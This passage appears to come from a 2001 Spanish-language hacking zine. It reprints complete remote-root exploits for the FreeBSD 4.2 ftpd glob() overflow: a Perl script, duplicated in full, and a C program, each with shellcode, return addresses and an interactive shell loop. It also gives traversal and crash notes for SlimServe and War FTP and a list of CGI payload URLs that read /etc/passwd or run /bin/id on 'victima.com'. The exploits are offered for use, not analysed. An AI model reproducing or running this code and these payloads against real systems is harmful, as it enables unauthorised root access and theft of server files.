+# this version requires user access and writeable homedir without chroot.     #
+###############################################################################
+
+require 5.002;
+use strict;
+use sigtrap;
+use Socket;
+
+my($recvbuf, $host, $user, $pass, $iaddr, $paddr, $proto, $code, $ret, $off, 
+$align, $rin, $rout, $rea
+d);
+
+# teso shellcode ripped from 7350obsd
+
+$code  = "\x31\xc0\x99\x52\x52\xb0\x17\xcd\x80\x68\xcc\x73\x68\xcc\x68";
+$code .= "\xcc\x62\x69\x6e\xb3\x2e\xfe\xc3\x88\x1c\x24\x88\x5c\x24\x04";
+$code .= "\x88\x54\x24\x07\x89\xe6\x8d\x5e\x0c\xc6\x03\x2e\x88\x53\x01";
+$code .= "\x52\x53\x52\xb0\x05\xcd\x80\x89\xc1\x8d\x5e\x05\x6a\xed\x53";
+$code .= "\x52\xb0\x88\xcd\x80\x53\x52\xb0\x3d\xcd\x80\x51\x52\xb0\x0c";
+$code .= "\x40\xcd\x80\xbb\xcc\xcc\xcc\xcc\x81\xeb\x9e\x9e\x9d\xcc\x31";
+$code .= "\xc9\xb1\x10\x56\x01\xce\x89\x1e\x83\xc6\x03\xe0\xf9\x5e\x8d";
+$code .= "\x5e\x10\x53\x52\xb0\x3d\xcd\x80\x89\x76\x0c\x89\x56\x10\x8d";
+$code .= "\x4e\x0c\x52\x51\x56\x52\xb0\x3b\xcd\x80\xc9\xc3\x55\x89\xe5";
+$code .= "\x83\xec\x08\xeb\x12\xa1\x3c\x50\x90";
+
+#$ret = 0xbfbfeae8; - stos lagoona
+#$ret = 0x805baf8; - bss info
+$ret = 0x805e23a; # - bss lagoon
+
+if (@ARGV < 3)
+{
+        print "Usage: $0 &lt;hostname> &lt;username> &lt;password> [align] [offset]\n";
+        exit;
+}
+
+($host, $user, $pass, $align, $off) = @ARGV;
+
+if (defined($off))
+{
+        $ret += $off;
+}
+
+if (!defined($align))
+{
+        $align = 1;
+}
+
+print "Globulka v1.0 by venglin\@freebsd.lublin.pl\n\n";
+print "RET: 0x" . sprintf('%lx', $ret) . "\n";
+print "Align: $align\n\n";
+
+$iaddr = inet_aton($host)                       or die "Unknown host: $host\n";
+$paddr = sockaddr_in(21, $iaddr)                or die "getprotobyname: $!\n";
+$proto = getprotobyname('tcp')                  or die "getprotobyname: $!\n";
+
+socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    or die "socket: $!\n";
+connect(SOCKET, $paddr)                         or die "connect: $!\n";
+
+do
+{
+        $recvbuf = &lt;SOCKET>;
+}
+while($recvbuf =~ /^220- /);
+
+print $recvbuf;
+
+if ($recvbuf !~ /^220 .+/)
+{
+        die "Exploit failed.\n";
+}
+
+send(SOCKET, "USER $user\r\n", 0)               or die "send: $!\n";
+$recvbuf = &lt;SOCKET>;
+
+if ($recvbuf !~ /^(331|230) .+/)
+{
+        print $recvbuf;
+        die "Exploit failed.\n";
+}
+
+send(SOCKET, "PASS $pass\r\n", 0)               or die "send: $!\n";
+$recvbuf = &lt;SOCKET>;
+
+if ($recvbuf !~ /^230 .+/)
+{
+        print $recvbuf;
+        die "Exploit failed.\n";
+}
+else
+{
+        print "Logged in as $user/$pass. Sending evil STAT command.\n\n";
+}
+
+send(SOCKET, "MKD " . "A"x255 . "\r\n", 0)              or die "send: $!\n";
+$recvbuf = &lt;SOCKET>;
+
+if ($recvbuf !~ /^(257|550) .+/)
+{
+        print $recvbuf;
+        die "Exploit failed.\n";
+}
+
+send(SOCKET, "STAT A*/../A*/../A*/" . "\x90" x (90+$align) . $code .
+        pack('l', $ret) x 30 . "\r\n", 0)               or die "send: $!\n";
+
+sleep 1;
+
+send(SOCKET, "id\n", 0)                         or die "send: $!\n";
+$recvbuf = &lt;SOCKET>;
+
+if ($recvbuf !~ /^uid=.+/)
+{
+        die "Exploit failed.\n";
+}
+else
+{
+        print $recvbuf;
+}
+
+vec($rin, fileno(STDIN), 1) = 1;
+vec($rin, fileno(SOCKET), 1) = 1;
+
+for(;;)
+{
+        $read = select($rout=$rin, undef, undef, undef);
+        if (vec($rout, fileno(STDIN), 1) == 1)
+        {
+                if (sysread(STDIN, $recvbuf, 1024) == 0)
+                {
+                        exit;
+                }
+                send(SOCKET, $recvbuf, 0);
+        }
+
+        if (vec($rout, fileno(SOCKET), 1) == 1)
+        {
+                if (sysread(SOCKET, $recvbuf, 1024) == 0)
+                {
+                        exit;
+                }
+                syswrite(STDIN, $recvbuf, 1024);
+        }
+}
+
+close SOCKET;
+
+exit;#!/usr/bin/perl
+
+# This is another version of globbing exploit, written about week ago. It
+# creates only one directory.
+
+
+###############################################################################
+# glob() ftpd remote root exploit for freebsd 4.2-stable                      #
+#                                                                             #
+# babcia padlina ltd. / venglin@freebsd.lublin.pl                             #
+#                                                                             #
+# this version requires user access and writeable homedir without chroot.     #
+###############################################################################
+
+require 5.002;
+use strict;
+use sigtrap;
+use Socket;
+
+my($recvbuf, $host, $user, $pass, $iaddr, $paddr, $proto, $code, $ret, $off,
+$align, $rin, $rout, $rea
+d);
+
+# teso shellcode ripped from 7350obsd
+
+$code  = "\x31\xc0\x99\x52\x52\xb0\x17\xcd\x80\x68\xcc\x73\x68\xcc\x68";
+$code .= "\xcc\x62\x69\x6e\xb3\x2e\xfe\xc3\x88\x1c\x24\x88\x5c\x24\x04";
+$code .= "\x88\x54\x24\x07\x89\xe6\x8d\x5e\x0c\xc6\x03\x2e\x88\x53\x01";
+$code .= "\x52\x53\x52\xb0\x05\xcd\x80\x89\xc1\x8d\x5e\x05\x6a\xed\x53";
+$code .= "\x52\xb0\x88\xcd\x80\x53\x52\xb0\x3d\xcd\x80\x51\x52\xb0\x0c";
+$code .= "\x40\xcd\x80\xbb\xcc\xcc\xcc\xcc\x81\xeb\x9e\x9e\x9d\xcc\x31";
+$code .= "\xc9\xb1\x10\x56\x01\xce\x89\x1e\x83\xc6\x03\xe0\xf9\x5e\x8d";
+$code .= "\x5e\x10\x53\x52\xb0\x3d\xcd\x80\x89\x76\x0c\x89\x56\x10\x8d";
+$code .= "\x4e\x0c\x52\x51\x56\x52\xb0\x3b\xcd\x80\xc9\xc3\x55\x89\xe5";
+$code .= "\x83\xec\x08\xeb\x12\xa1\x3c\x50\x90";
+
+#$ret = 0xbfbfeae8; - stos lagoona
+#$ret = 0x805baf8; - bss info
+$ret = 0x805e23a; # - bss lagoon
+
+if (@ARGV < 3)
+{
+        print "Usage: $0 &lt;hostname> &lt;username> &lt;password> [align] [offset]\n";
+        exit;
+}
+
+($host, $user, $pass, $align, $off) = @ARGV;
+
+if (defined($off))
+{
+        $ret += $off;
+}
+
+if (!defined($align))
+{
+        $align = 1;
+}
+
+print "Globulka v1.0 by venglin\@freebsd.lublin.pl\n\n";
+print "RET: 0x" . sprintf('%lx', $ret) . "\n";
+print "Align: $align\n\n";
+
+$iaddr = inet_aton($host)                       or die "Unknown host: $host\n";
+$paddr = sockaddr_in(21, $iaddr)                or die "getprotobyname: $!\n";
+$proto = getprotobyname('tcp')                  or die "getprotobyname: $!\n";
+
+socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    or die "socket: $!\n";
+connect(SOCKET, $paddr)                         or die "connect: $!\n";
+
+do
+{
+        $recvbuf = &lt;SOCKET>;
+}
+while($recvbuf =~ /^220- /);
+
+print $recvbuf;
+
+if ($recvbuf !~ /^220 .+/)
+{
+        die "Exploit failed.\n";
+}
+
+send(SOCKET, "USER $user\r\n", 0)               or die "send: $!\n";
+$recvbuf = &lt;SOCKET>;
+
+if ($recvbuf !~ /^(331|230) .+/)
+{
+        print $recvbuf;
+        die "Exploit failed.\n";
+}
+
+send(SOCKET, "PASS $pass\r\n", 0)               or die "send: $!\n";
+$recvbuf = &lt;SOCKET>;
+
+if ($recvbuf !~ /^230 .+/)
+{
+        print $recvbuf;
+        die "Exploit failed.\n";
+}
+else
+{
+        print "Logged in as $user/$pass. Sending evil STAT command.\n\n";
+}
+
+send(SOCKET, "MKD " . "A"x255 . "\r\n", 0)              or die "send: $!\n";
+$recvbuf = &lt;SOCKET>;
+
+if ($recvbuf !~ /^(257|550) .+/)
+{
+        print $recvbuf;
+        die "Exploit failed.\n";
+}
+
+send(SOCKET, "STAT A*/../A*/../A*/" . "\x90" x (90+$align) . $code .
+        pack('l', $ret) x 30 . "\r\n", 0)               or die "send: $!\n";
+
+sleep 1;
+
+send(SOCKET, "id\n", 0)                         or die "send: $!\n";
+$recvbuf = &lt;SOCKET>;
+
+if ($recvbuf !~ /^uid=.+/)
+{
+        die "Exploit failed.\n";
+}
+else
+{
+        print $recvbuf;
+}
+
+vec($rin, fileno(STDIN), 1) = 1;
+vec($rin, fileno(SOCKET), 1) = 1;
+
+for(;;)
+{
+        $read = select($rout=$rin, undef, undef, undef);
+        if (vec($rout, fileno(STDIN), 1) == 1)
+        {
+                if (sysread(STDIN, $recvbuf, 1024) == 0)
+                {
+                        exit;
+                }
+                send(SOCKET, $recvbuf, 0);
+        }
+
+        if (vec($rout, fileno(SOCKET), 1) == 1)
+        {
+                if (sysread(SOCKET, $recvbuf, 1024) == 0)
+                {
+                        exit;
+                }
+                syswrite(STDIN, $recvbuf, 1024);
+        }
+}
+
+close SOCKET;
+
+exit;
+
+
+#-------------Acaba aqui-------------------------------------
+
+
+
+
+
+---------------------------FreeBsd 4.2 fbsdftp-ex.c---------------------------
+
+
+
+/*-----------------------------Empezad aqui------------------------------*/
+/*
+ * (c) Apr 2001 noah williamsson / tm@ns2.crw.se
+ *
+ * Compile:
+ *   BSD/Linux: gcc -o fbsdftp-ex -O2 -Wall fbsdftp-ex.c
+ *   Solaris: cc -o fbsdftp-ex -O2 -Wall -lresolv -lsocket -lnsl fbsdftp-ex.c
+ *
+ * Credits:
+ *   fishstiqz (shellcode)
+ *
+ * Greets:
+ *   #Hack.SE
+ *
+ * For adding new targets, some hints are available 
+ * around line 180 in this file.
+ *
+ */
+
+
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
+#include &lt;unistd.h>
+#include &lt;string.h>
+#include &lt;errno.h>
+#include &lt;sys/types.h>
+#include &lt;sys/socket.h>
+#include &lt;sys/time.h>
+#include &lt;netdb.h>
+#include &lt;netinet/in.h>
+#include &lt;arpa/inet.h>
+#include &lt;resolv.h>
+#include &lt;signal.h>
+#include &lt;sys/stat.h>
+
+
+// #define DEBUG
+
+
+int type, verbose, s;
+char kjellkode[] = {
+        /* fishstiqz' bsd c0de */
+        "\x29\xc0\x50\xb0\x17\x50\xcd\x80"
+        "\x29\xc0\x50\xbf\x66\x69\x73\x68"
+        "\x29\xf6\x66\xbe\x49\x46\x31\xfe"
+        "\x56\xbe\x49\x0b\x1a\x06\x31\xfe"
+        "\x56\x89\xe3\x50\x54\x50\x54\x53"
+        "\xb0\x3b\x50\xcd\x80"
+};
+
+struct { 
+        char *name;
+        unsigned long neweip;
+        int offset;
+        int align;
+        int mkds;
+        int cwds;
+} targets[] = {
+        { "FreeBSD 4.2R ftpd default installation", 0xbfbfa410, 0x58, 0, 26,
+50 },
+        { "FreeBSD 4.2R ftpd compiled with -ggdb",  0xbfbfa430,  0x58, 0, 26, 
+50 },
+        { "FreeBSD 4.2S as of Sept 2000", 0xbfbfa450, 0x58, 0, 26, 50 },
+        { 0 }
+};
+
+
+int main(int, char **);
+void sig(int);
+int opensock(char *);
+void usage(void);
+void ftpd_exp(char *, char *);
+void ftpd_mkd(int);
+void tunnel(int);
+
+
+int main(int argc, char *argv[]) {
+        char *host, *user, *pass, buf[8192];
+        int i, create_dirs = 0;
+
+        if(argc < 4)
+          usage();
+
+        for(i = 1; i < argc; i++) {
+                if(!strcmp(argv[i], "-t"))
+                        type = atoi(argv[++i]);
+                if(!strcmp(argv[i], "-v"))
+                        verbose = 1;
+                else if(!strcmp(argv[i], "-c"))
+                        create_dirs = 1;
+        }
+
+        pass = argv[argc-1];
+        user = argv[argc-2];
+        host = argv[argc-3];
+
+        if((s = opensock(host)) <= 0)
+                return -1;
+
+        printf("[xplt] Target host is %s\n", targets[type].name);
+        memset(buf, 0, sizeof(buf));
+        read(s, buf, sizeof(buf));
+
+        sprintf(buf, "USER %s\r\n", user);
+        write(s, buf, strlen(buf));
+        memset(buf, 0, sizeof(buf));
+        read(s, buf, sizeof(buf));
+
+        sprintf(buf, "PASS %s\r\n", pass);
+        write(s, buf, strlen(buf));
+        memset(buf, 0, sizeof(buf));
+
+        sleep(1);
+        read(s, buf, sizeof(buf));
+
+#ifdef DEBUG
+        printf("[xplt] Hit enter\n");
+        read(0, buf, sizeof(buf));
+#endif
+
+        if(create_dirs) {
+                chdir("~");
+                ftpd_mkd(targets[type].mkds);
+        }
+
+        ftpd_exp(user, pass);
+
+        close(s);
+
+        return 0;
+}
+
+
+void ftpd_exp(char *login, char *pass) {
+        char buf[4096];
+        int rep;
+
+        signal(SIGINT, sig);
+
+        sprintf(buf, "STAT CCC*");
+        for(rep = 0; rep < targets[type].cwds; rep++)
+                strcat(buf, "/*");
+
+        strcat(buf, "\r\n");
+        write(s, buf, strlen(buf));
+
+        sprintf(buf, "echo '[+] If you can see this line you have a shell [+]' 
+; /usr/bin/id\n");
+        write(s, buf, strlen(buf));
+
+        printf("[xplt] If you don't receive a line with uid=0 within a few 
+seconds the exploit probably didn't work\n");
+
+        tunnel(s);
+}
+
+
+void ftpd_mkd(int numdirs) {
+        char buf[1024], ftpcmd[1024];
+        int i;
+
+        sprintf(buf, "CWD ~\r\n");
+        write(s, buf, strlen(buf));
+        memset(buf, 0, sizeof(buf));
+        read(s, buf, sizeof(buf));
+        if(verbose) printf("FTP:cwd ~> %s", buf);
+
+        for(i = 0; i < numdirs; i++) {
+                memset(buf, 0, sizeof(buf));
+
+                if(i == 1) {
+                        memset(buf, 0x90, 40);
+                        memcpy(buf+strlen(buf), kjellkode, strlen(kjellkode));
+                        memset(buf+strlen(buf), 0x90, 203-strlen(buf));
+                }
+                else if('C'+i == targets[type].offset) {
+                        int j;
+#ifdef DEBUG
+                        
+                        /*
+                         * Start gdb -se=/usr/libexec/ftpd
+                         * Attach the ftpd process when you see 'Hit enter'
+                         * Hit enter.
+                         *
+                         * Offset is (segv addy & 0xff) - 0x30
+                         *
+                         * Find neweip by doing x/1000wx 0xbfbfa00
+                         * and look for 0x90909090
+                         *
+                         */
+
+                        for(j = 0; j < 39; j++)
+                                buf[j] = j + 0x30;
+#else
+                        for(j = 0; j < 40; j+=4)
+                                *(unsigned long 
+*)(&buf[j+targets[type].align]) = targets[type].neweip;
+#endif
+                }
+                else {
+                        memset(buf, 'C'+i, 39);
+                }
+
+                sprintf(ftpcmd, "MKD %s\r\n", buf);
+                write(s, ftpcmd, strlen(ftpcmd));
+                memset(buf, 0, sizeof(buf));
+                read(s, buf, 510);
+                if(verbose) printf("FTP:mkd> %s", buf);
+
+                memcpy(ftpcmd, "CW", 2);
+                write(s, ftpcmd, strlen(ftpcmd));
+                memset(buf, 0, sizeof(buf));
+                read(s, buf, 510);
+                if(verbose) printf("FTP:cwd> %s", buf);
+        }
+
+        printf("[xplt] Created %d directories\n", i);
+        sprintf(buf, "CWD ~\r\n");
+        write(s, buf, strlen(buf));
+        memset(buf, 0, sizeof(buf));
+        read(s, buf, sizeof(buf));
+        if(verbose) printf("FTP:cwd ~> %s", buf);
+}
+
+
+int opensock(char *host) {
+        int s;
+        struct sockaddr_in remote_sin;
+        struct hostent *he;
+
+        if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+                perror("socket()");
+                return -1;
+        }
+
+        memset((char *)&remote_sin, 0, sizeof(remote_sin));
+        if((he = gethostbyname(host)) != NULL)
+                memcpy((char *)&remote_sin.sin_addr, he->h_addr, he->h_length);
+        else if((remote_sin.sin_addr.s_addr = inet_addr(host)) < 0) {
+                perror("gethostbyname()/inet_addr()");
+                return -1;
+        }
+
+        remote_sin.sin_family = AF_INET;
+        remote_sin.sin_port = htons(21);
+
+        if(connect(s, (struct sockaddr *)&remote_sin, sizeof(remote_sin)) == 
+-1) {
+                perror("connect()");
+                close(s);
+                return -1;
+        }
+              
+        return s;
+}
+
+
+void usage(void) {
+        int i;
+
+
+        printf("Usage: ./fbsdftp-ex [-t &lt;num>] [-c] [-v] &lt;ftphost> &lt;ftpuser> 
+&lt;ftppass>\n");
+        printf("\t-t\tTarget host type\n");
+        printf("\t-c\tCreate evil directories\n");
+        printf("\t-v\tVerbose\n");
+        printf("\nValid targets:\n");
+
+        for(i = 0; targets[i].name; i++) {
+                printf("%d\t%s\n", i, targets[i].name);
+        }
+
+        exit(0);
+}
+
+
+void sig(int signo) {
+        close(s);
+        printf("Die!\n");
+        exit(0);
+}
+
+
+void tunnel(int sock) {
+        char fbuf[1024], tbuf[1024];
+        int ret, idx_f = 0, idx_t = 0;
+        int input = 0, output = 1;
+        struct timeval tv;
+        fd_set rd, wd;
+
+        FD_ZERO(&rd);
+        FD_ZERO(&wd);
+        for(;;) {
+                if(idx_t < 1024)
+                        FD_SET(input, &rd);
+
+                if(idx_f < 1024)
+                        FD_SET(sock, &rd);
+
+                tv.tv_sec = 1;
+                tv.tv_usec = 0;
+                ret = select(sock+1, &rd, &wd, NULL, NULL);
+                if(ret < 1)
+                        continue;
+
+                if(FD_ISSET(sock, &rd) && idx_f != 1024) {
+                        ret = read(sock, fbuf + idx_f, sizeof(fbuf) - idx_f);
+                        if(ret < 1)
+                                break;
+
+                        idx_f += ret;
+                        FD_CLR(sock, &rd);
+                }
+
+                if(FD_ISSET(input, &rd) && idx_t != 1024) {
+                        ret = read(input, tbuf + idx_t, sizeof(tbuf) - idx_t);
+                        if(ret < 1)
+                                break;
+        
+                        idx_t += ret;
+                        FD_CLR(input, &rd);
+                }
+
+                if(idx_f) {
+                        if((ret = write(output, fbuf, idx_f)) < 1)
+                                break;
+
+                        if(!(idx_f -= ret))
+                                memcpy(fbuf, fbuf + ret, idx_f);
+                }
+
+                if(idx_t) {
+                        if((ret = write(sock, tbuf, idx_t)) < 1)
+                                break;
+
+                        if(!(idx_t -=ret))
+                                memcpy(tbuf, tbuf + ret, idx_t);
+                }
+        }
+
+        close(sock);
+        /* DMT$MTA */
+}
+
+
+/* -------------------  Aqui se acaba---------------------------*/
+
+
+4║ Plato: HTTPd v1.1 y FTPd v1.0 SlimServe 
+
+HTTPd v1.1 y FTPd v1.0 SlimServe son  un sevidor web y  de ftp 
+respectivamente, que corren desde win95,98,NT 4.0 y 2000, es un xploit tipo 
+dos, y se produce al enviar 80000 caracteres al servidor en el caso del ftp te
+deja ciertos privilegios ;) y te da esta respuesta:
+
+En el caso del servidor HTTP:(una url larga)
+SLIMHTTP caused an invalid page fault in
+module SLIMHTTP.EXE at 017f:004021db.
+Registers:
+EAX=ffffffff CS=017f EIP=004021db EFLGS=00010286
+EBX=00412678 SS=0187 ESP=00eafa1c EBP=000400a4
+ECX=81726914 DS=0187 ESI=00eb0000 FS=3b57
+EDX=8172691c ES=0187 EDI=00000068 GS=402e
+Bytes at CS:EIP:
+8a 06 3c 0d 75 05 c6 06 00 eb 04 3c 0a 74 1a 66
+Stack dump:
+00eafe99 00eafd5d 00000000 0000000f
+00000000 00000001 00000068 00000000
+00000000 00000000 00000000 00000000
+00000000 00000000 00000000 00000000
+
+En el caso del FTP, te permite salirte al directorio raiz
+
+ ftp localhost
+Connected to xxxxxxxxxx.
+220-SlimServe FTPd 1.0 :: www.whitsoftdev.com.
+220 127.0.0.1 connected to xxxxxxxxxx.
+User (xxxxxxxxxx:(none)): anonymous
+230 User anonymous logged in, proceed.
+ftp> cd ...
+250 CWD command successful.
+ftp> get autoexec.bat
+200 PORT command successful.
+150 Opening data connection for "/.../autoexec.bat".
+250 RETR command successful.
+ftp: 383 bytes received in 0.16Seconds 2.39Kbytes/sec.
+ftp>
+
+
+
+
+
+------------ 5║ PLATO War Ftp 1.67 --------------------------
+
+Bueno ya estareis llenos tantos platos, bueno war ftp es un servidor muy 
+estendido por sun facilidad para plataformas win, permite al atacante cambiar 
+de directorio y moverse mas  alla de los dominios del ftp, mediante el uso de 
+rutas relativas, por ejeplo si pones el comando "dir *./../..", podras ver 
+el directorio situado por encima del ftp
+
+
+
+
+
+-------------POSTRE - cgis a tako ----------------------------
+
+Como se que ya estais llenos os voy a poner algo de cgi para digerir bien la 
+comida.
+
+15/4/2001 Anaconda Clipper ver. 3.3, posibilidad de ver archivos en el
+servidor. 
+xploit:
+
+http://victima.com/cgi-bin/anacondaclip.pl?\template=
+../../../../../../../../../../../../../../../../../../etc/passwd
+
+14/4/2001 talkback - Posibilidad de visualizar archivos interesantes del server
+
+
+
+xploit:
+
+Para ver /etc/passd
+http://www.victima.com/cgi-bin/talkback.cgi?article=
+../../../../../../../../etc/passwd%00&action=view&matchview=1
+Para ver los pass de admin
+ttp://www.victima.com/cgi-bin/talkback.cgi?article=
+../cgi-bin/talkback.cgi%00&action=view&matchview=1
+
+23/3/2001 ikonboard ------- mas archivos buenos que visualizar
+
+http://www.victima.com/cgi-bin/ikonboard/help.cgi?helpon=../../../../../etc/passwd%00
+
+
+7/3/2001 auktion (posibilidad de ejecutar comandos de forma  remota)
+
+http://www.victim.com/cgi-bin/auktion.pl?menue=/bin/id
+
+6/3/2001 WebSPIRS CGI script -- fisgando archivos ajenos
+
+http://www.victima.com/cgi-bin/store.cgi?StartID=../etc/hosts%00.html
+http://www.vicitma.com/cgi-bin/store.cgi?StartID=../etc/%00.html
+
+6/3/2001 way-board -- mas archivos que poder ver
+
+http://www.victima.com/way-board/way-board.cgi?db=url_to_any_file%00
+
+
+
+Espero que os sean utiles y os diviertan, un saludo, la proxima sera mejor
+
+
+
+
+
+   ####################
+   #  DISIDENTS  2001 #
+   ####################
+
+
+```
+
+</div>
